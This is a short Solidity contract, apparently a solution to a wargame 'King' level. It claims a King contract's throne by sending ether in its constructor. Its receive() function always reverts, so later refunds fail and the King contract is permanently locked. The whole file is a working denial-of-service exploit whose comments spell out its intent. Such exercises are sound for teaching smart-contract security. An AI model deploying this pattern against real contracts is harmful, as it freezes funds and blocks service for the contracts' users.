// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract King4Ever {

  // claim throne of King contract
  constructor(address _kingContract) public payable {
    require(msg.value >= 1000000000000000 wei); // outbid current king
    (bool success, ) = payable(_kingContract).call{ value: msg.value }("");
    require(success);
  }

  // revert transfer from King contract -> fail transaction -> stay king
  receive() external payable {
    revert();
  }
}
